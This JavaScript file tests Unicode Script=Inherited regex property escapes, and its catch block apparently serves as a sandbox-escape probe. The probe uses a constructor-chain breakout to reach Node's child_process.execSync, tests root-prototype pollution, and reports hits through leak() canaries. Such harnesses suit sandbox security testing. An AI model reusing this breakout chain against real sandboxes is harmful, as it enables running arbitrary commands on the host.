try {
    const matchSymbols = buildString({
        loneCodePoints: [
            1648,
            7405,
            7412,
            66045,
            66272,
            70459
        ],
        ranges: [
            [
                768,
                879
            ],
            [
                1157,
                1158
            ],
            [
                1611,
                1621
            ],
            [
                2385,
                2388
            ],
            [
                6832,
                6848
            ],
            [
                7376,
                7378
            ],
            [
                7380,
                7392
            ],
            [
                7394,
                7400
            ],
            [
                7416,
                7417
            ],
            [
                7616,
                7673
            ],
            [
                7675,
                7679
            ],
            [
                8204,
                8205
            ],
            [
                8400,
                8432
            ],
            [
                12330,
                12333
            ],
            [
                12441,
                12442
            ],
            [
                65024,
                65039
            ],
            [
                65056,
                65069
            ],
            [
                119143,
                119145
            ],
            [
                119163,
                119170
            ],
            [
                119173,
                119179
            ],
            [
                119210,
                119213
            ],
            [
                917760,
                917999
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script=Inherited}+$/u, matchSymbols, '\\p{Script=Inherited}');
    testPropertyEscapes(/^\p{Script=Zinh}+$/u, matchSymbols, '\\p{Script=Zinh}');
    testPropertyEscapes(/^\p{Script=Qaai}+$/u, matchSymbols, '\\p{Script=Qaai}');
    testPropertyEscapes(/^\p{sc=Inherited}+$/u, matchSymbols, '\\p{sc=Inherited}');
    testPropertyEscapes(/^\p{sc=Zinh}+$/u, matchSymbols, '\\p{sc=Zinh}');
    testPropertyEscapes(/^\p{sc=Qaai}+$/u, matchSymbols, '\\p{sc=Qaai}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            7379,
            7393,
            7674
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                767
            ],
            [
                880,
                1156
            ],
            [
                1159,
                1610
            ],
            [
                1622,
                1647
            ],
            [
                1649,
                2384
            ],
            [
                2389,
                6831
            ],
            [
                6849,
                7375
            ],
            [
                7401,
                7404
            ],
            [
                7406,
                7411
            ],
            [
                7413,
                7415
            ],
            [
                7418,
                7615
            ],
            [
                7680,
                8203
            ],
            [
                8206,
                8399
            ],
            [
                8433,
                12329
            ],
            [
                12334,
                12440
            ],
            [
                12443,
                56319
            ],
            [
                57344,
                65023
            ],
            [
                65040,
                65055
            ],
            [
                65070,
                66044
            ],
            [
                66046,
                66271
            ],
            [
                66273,
                70458
            ],
            [
                70460,
                119142
            ],
            [
                119146,
                119162
            ],
            [
                119171,
                119172
            ],
            [
                119180,
                119209
            ],
            [
                119214,
                917759
            ],
            [
                918000,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Inherited}+$/u, nonMatchSymbols, '\\P{Script=Inherited}');
    testPropertyEscapes(/^\P{Script=Zinh}+$/u, nonMatchSymbols, '\\P{Script=Zinh}');
    testPropertyEscapes(/^\P{Script=Qaai}+$/u, nonMatchSymbols, '\\P{Script=Qaai}');
    testPropertyEscapes(/^\P{sc=Inherited}+$/u, nonMatchSymbols, '\\P{sc=Inherited}');
    testPropertyEscapes(/^\P{sc=Zinh}+$/u, nonMatchSymbols, '\\P{sc=Zinh}');
    testPropertyEscapes(/^\P{sc=Qaai}+$/u, nonMatchSymbols, '\\P{sc=Qaai}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}